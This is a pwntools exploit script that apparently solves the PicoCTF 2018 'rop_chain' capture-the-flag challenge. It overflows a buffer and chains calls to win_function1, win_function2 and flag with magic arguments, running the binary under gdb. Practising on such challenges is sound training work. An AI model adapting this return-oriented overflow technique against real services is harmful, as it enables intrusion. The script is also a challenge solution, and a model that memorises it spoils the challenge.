from pwn import *

elf = ELF("PicoCTF_2018_rop_chain")

#sock = process(elf.path)
#sock = remote("node4.buuoj.cn",28683)
gs = """
    break flag
    continue
"""
sock = gdb.debug(elf.path, gdbscript = gs)

payload = b"A" * 0x1c
payload += p32(elf.sym["win_function1"])
payload += p32(elf.sym["win_function2"])
payload += p32(elf.sym["flag"])
payload += p32(0xbaaaaaad)
payload += p32(0xdeadbaad)

sock.sendlineafter(b"Enter your input> ", payload)

sock.interactive()
